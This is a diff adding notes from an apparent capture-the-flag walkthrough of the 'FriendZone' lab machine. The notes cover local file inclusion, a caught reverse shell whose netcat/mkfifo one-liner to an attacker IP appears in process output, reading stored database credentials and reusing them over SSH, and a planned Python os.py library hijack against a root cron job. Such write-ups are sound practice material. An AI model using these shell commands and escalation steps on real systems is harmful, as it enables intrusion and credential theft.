@@ -621,6 +621,268 @@ ok - _that_ is LFI
 
 change `pagename=timestamp` to .. what?
 
+### back again
+
+```
+$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -X POST 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../uploads/upload.php'
+<title>FriendZone Admin !</title><br><br><br><center><h2>Smart photo script for friendzone corp !</h2></center><center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center><center><img src='images/a.jpg'></center><center><h1>Something went worng ! , the script include wrong param !</h1></center>
+```
+
+different than
+
+```
+$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -X POST 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../uploads/upload'
+<title>FriendZone Admin !</title><br><br><br><center><h2>Smart photo script for friendzone corp !</h2></center><center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center><center><img src='images/a.jpg'></center><center><h1>Something went worng ! , the script include wrong param !</h1></center>WHAT ARE YOU TRYING TO DO HOOOOOOMAN !
+```
+
+keep saying "the script include wrong param", but `default is image_id=a.jpg&pagename=timestamp` and that's what we're sending
+
+
+### after a lot of shenanigans
+
+see [lfi.rb](lfi.rb), finally get to
+
+```
+$ nc -lvp 4444
+Listening on 0.0.0.0 4444
+Connection received on friendzone.htb 43122
+/bin/sh: 0: can't access tty; job control turned off
+$ id -a
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ pwd
+/var/www/admin
+$ ls -la
+total 28
+drwxr-xr-x 3 root root 4096 Sep 13  2022 .
+drwxr-xr-x 8 root root 4096 Sep 13  2022 ..
+-rw-r--r-- 1 root root 1169 Jan 16  2019 dashboard.php
+drwxr-xr-x 2 root root 4096 Sep 13  2022 images
+-rw-r--r-- 1 root root 2873 Oct  6  2018 index.html
+-rw-r--r-- 1 root root  384 Oct  7  2018 login.php
+-rw-r--r-- 1 root root   89 Oct  7  2018 timestamp.php
+$ ls images
+a.jpg
+b.jpg
+$ cd ..
+$ ls -la
+total 36
+drwxr-xr-x  8 root root 4096 Sep 13  2022 .
+drwxr-xr-x 12 root root 4096 Sep 13  2022 ..
+drwxr-xr-x  3 root root 4096 Sep 13  2022 admin
+drwxr-xr-x  4 root root 4096 Sep 13  2022 friendzone
+drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportal
+drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportaladmin
+drwxr-xr-x  3 root root 4096 Sep 13  2022 html
+-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
+drwxr-xr-x  3 root root 4096 Sep 13  2022 uploads
+$ cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+$
+```
+
+```
+$ ls /home
+total 12
+drwxr-xr-x  3 root   root   4096 Sep 13  2022 .
+drwxr-xr-x 22 root   root   4096 Sep 13  2022 ..
+drwxr-xr-x  5 friend friend 4096 Sep 13  2022 friend
+$ ls /home/friend
+total 36
+drwxr-xr-x 5 friend friend 4096 Sep 13  2022 .
+drwxr-xr-x 3 root   root   4096 Sep 13  2022 ..
+lrwxrwxrwx 1 root   root      9 Jan 24  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 friend friend  220 Oct  5  2018 .bash_logout
+-rw-r--r-- 1 friend friend 3771 Oct  5  2018 .bashrc
+drwx------ 2 friend friend 4096 Sep 13  2022 .cache
+drwx------ 3 friend friend 4096 Sep 13  2022 .gnupg
+drwxrwxr-x 3 friend friend 4096 Sep 13  2022 .local
+-rw-r--r-- 1 friend friend  807 Oct  5  2018 .profile
+-r--r--r-- 1 root   root     33 Mar 18 16:38 user.txt
+$ cat /home/friend/user.txt
+8c9f0ef0d7eaf8a6f5fafae813b6f8bc
+```
+
+user down!
+
+but now it's not clear if we even need to pop `friend` before we get to root
+
+also not clear whether there is actually a mysql db running. kicking linpeas to take care of some of this
+
+### working it out
+
+```
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
+root          1  0.0  0.9 159568  8936 ?        Ss   Mar18   0:03 /sbin/init splash
+root        217  0.1  1.2 201392 11276 ?        Ssl  Mar18   0:31 /usr/bin/vmtoolsd
+root        234  0.0  1.5  95152 14476 ?        S<s  Mar18   0:00 /lib/systemd/systemd-journald
+root        247  0.0  0.4  45064  3952 ?        Ss   Mar18   0:00 /lib/systemd/systemd-udevd
+systemd+    362  0.0  0.5  70612  5180 ?        Ss   Mar18   0:03 /lib/systemd/systemd-resolved
+systemd+    363  0.0  0.3 141912  3224 ?        Ssl  Mar18   0:02 /lib/systemd/systemd-timesyncd
+  └─(Caps) 0x0000000002000000=cap_sys_time
+root        448  0.0  0.7 287540  6880 ?        Ssl  Mar18   0:00 /usr/lib/accountsservice/accounts-daemon[0m
+message+    452  0.0  0.4  49928  4344 ?        Ss   Mar18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root        494  0.0  0.3  31320  3196 ?        Ss   Mar18   0:00 /usr/sbin/cron -f
+root        495  0.0  0.6  62004  5676 ?        Ss   Mar18   0:00 /lib/systemd/systemd-logind
+syslog      499  0.0  0.5 263036  4892 ?        Ssl  Mar18   0:00 /usr/sbin/rsyslogd -n
+root        500  0.0  1.8 170408 17204 ?        Ssl  Mar18   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root        501  0.0  1.1  87740 10196 ?        Ss   Mar18   0:00 /usr/bin/VGAuthService
+root        570  0.0  1.3 265344 12412 ?        Ss   Mar18   0:00 /usr/sbin/nmbd --foreground --no-process-group
+bind        571  0.0  2.1 216300 20136 ?        Ssl  Mar18   0:02 /usr/sbin/named -f -4 -u bind
+  └─(Caps) 0x0000000001000400=cap_net_bind_service,cap_sys_resource
+root        593  0.0  0.2  28676  2736 ?        Ss   Mar18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+root        594  0.0  0.6  72296  5636 ?        Ss   Mar18   0:00 /usr/sbin/sshd -D
+root        657  0.0  0.2  16180  1988 tty1     Ss+  Mar18   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
+root        890  0.0  2.0 331712 19168 ?        Ss   Mar18   0:01 /usr/sbin/apache2 -k start
+www-data    894  0.0  1.8 336588 17404 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+www-data   1705  0.0  0.0   4628   856 ?        S    Mar18   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444>/tmp/f
+www-data   1708  0.0  0.0   4672   732 ?        S    Mar18   0:00  |       _ cat /tmp/f
+www-data   1709  0.0  0.0   4628   776 ?        S    Mar18   0:00  |       _ /bin/sh -i
+www-data   1710  0.0  0.2  15716  2100 ?        S    Mar18   0:00  |       _ nc 10.10.14.3 4444
+www-data    895  0.0  1.9 336580 18088 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+www-data    896  0.0  1.9 336580 18288 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+www-data    897  0.0  1.9 336580 17756 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+www-data    898  0.0  1.8 336652 17436 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+www-data   1691  0.0  0.0   4628   804 ?        S    Mar18   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444>/tmp/f
+www-data   1694  0.0  0.0   4672   768 ?        S    Mar18   0:00  |       _ cat /tmp/f
+www-data   1695  0.0  0.1   4628  1704 ?        S    Mar18   0:00  |       _ /bin/sh -i
+www-data   2993  0.9  0.5  20276  5072 ?        S    01:09   0:00  |       |   _ bash linpeas.sh
+www-data   6002  0.0  0.4  20276  3692 ?        S    01:09   0:00  |       |       _ bash linpeas.sh
+www-data   6006  0.0  0.3  36840  3268 ?        R    01:09   0:00  |       |       |   _ ps fauxwww
+www-data   6005  0.0  0.2  20276  2268 ?        S    01:09   0:00  |       |       _ bash linpeas.sh
+www-data   1696  0.0  0.2  15716  2100 ?        S    Mar18   0:00  |       _ nc 10.10.14.3 4444
+www-data   1057  0.0  1.8 336644 17460 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+www-data   1711  0.0  1.2 336116 11160 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
+root        902  0.0  2.2 357068 20576 ?        Ss   Mar18   0:00 /usr/sbin/smbd --foreground --no-process-group
+root        906  0.0  0.6 345028  6028 ?        S    Mar18   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+root        907  0.0  0.5 345052  4672 ?        S    Mar18   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+root        909  0.0  0.7 357052  6920 ?        S    Mar18   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+Debian-+    903  0.0  0.5  65648  4896 ?        Ss   Mar18   0:00 /usr/sbin/exim4 -bd -q30m
+
+...
+
+tcp        0      0 10.10.10.123:53         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -
+tcp6       0      0 :::445                  :::*                    LISTEN      -
+tcp6       0      0 :::139                  :::*                    LISTEN      -
+
+
+...
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/etc/Development
+/etc/Development/cmd.php
+/etc/sambafiles
+/run/lock
+/run/lock/apache2
+/tmp
+/tmp/linpeas.sh
+/usr/lib/python2.7
+/usr/lib/python2.7/os.py
+/var/cache/apache2/mod_cache_disk
+/var/lib/php/sessions
+/var/spool/samba
+/var/tmp
+```
+
+```
+-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
+-rw-rw-r--  1 friend friend  25583 Jan 15  2019 os.pyc
+```
+
+maybe we do need to get to `friend`..
+
+what's listening on `953`?
+
+```
+$ nc -v localhost 953
+nc: connect to localhost port 953 (tcp) failed: Connection refused
+Connection to localhost 953 port [tcp/*] succeeded!
+?
+
+HELO
+```
+
+ok, that's strange
+
+also don't see mysql running, so maybe the creds mentioned are straight ssh?
+
+
+```
+$ ssh -l friend friendzone.htb
+Warning: Permanently added 'friendzone.htb' (ED25519) to the list of known hosts.
+friend@friendzone.htb's password:
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+You have mail.
+Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
+friend@FriendZone:~$
+```
+
+indeed.
+
+```
+friend@FriendZone:~$ mail
+No mail for friend
+```
+
+second time we've seen conflicting messages, it's like something is going on in the background, so.. pspy is probably the thing we need
+
+linpeas didn't show us much new, so going that way 
+
+```
+2023/03/19 01:28:01 CMD: UID=0    PID=31800  | /bin/sh -c /opt/server_admin/reporter.py 
+2023/03/19 01:28:01 CMD: UID=0    PID=31799  | /bin/sh -c /opt/server_admin/reporter.py 
+2023/03/19 01:28:01 CMD: UID=0    PID=31798  | /usr/sbin/CRON -f 
+```
+
+almost right off the bat.. because we forgot to manually check `/opt` contents
+
+```
+$ cat /opt/server_admin/reporter.py
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+```
+
+and now we see why `os.py` is important. because the command is commented out and we don't have write access, presumably we need to poison some initialization that is caused by the import?
 
 ## flag
 ```
